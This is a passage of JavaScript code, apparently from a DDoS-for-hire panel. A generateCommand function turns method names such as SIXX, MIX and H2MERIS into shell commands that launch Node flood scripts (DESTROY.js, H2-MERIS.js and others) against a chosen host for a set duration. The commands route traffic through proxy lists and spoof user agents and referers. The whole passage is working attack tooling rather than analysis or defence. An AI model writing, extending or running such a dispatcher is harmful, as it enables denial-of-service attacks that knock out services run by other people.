...
const generateCommand = (method, host, port, time) => {
    switch (method) {
        ...
        case 'SIXX':
            return `cd /root/methods && node DESTROY.js ${host} ${time} 32 4 proxy.txt`;
        case 'CATMIA':
            return `cd /root/methods && node Vzy.js ${host} ${time} 32 4 proxy.txt`;
        case 'MIX':
            return `cd /root/methods && node mix.js ${host} ${time} 10 32 proxy.txt -v 1`;
        case 'TLS':
        ...
        case 'H2MERIS':
            return `cd /root/methods && node H2-MERIS.js GET ${host} ${time} 4 32 proxy.txt --query 1 --bfm true --httpver "http/1.1" --referer %RAND% --ua "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/132.0.0.0 Mobile Safari/537.36" --ratelimit true`;
        case 'TCPSSH':
